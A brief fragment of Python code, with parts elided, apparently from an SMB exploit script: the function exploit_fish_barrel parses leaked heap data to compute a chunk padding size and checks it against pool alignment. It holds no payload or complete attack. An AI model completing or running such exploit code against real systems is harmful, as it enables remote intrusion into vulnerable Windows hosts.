...
def exploit_fish_barrel(conn, pipe_name, info):
	...
	byte_leakData = str.encode(leakData)
	heap_chunk_size = unpack_from('<H', byte_leakData)
	HEAP_CHUNK_PAD_SIZE= heap_chunk_size[0]
	
	if HEAP_CHUNK_PAD_SIZE != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
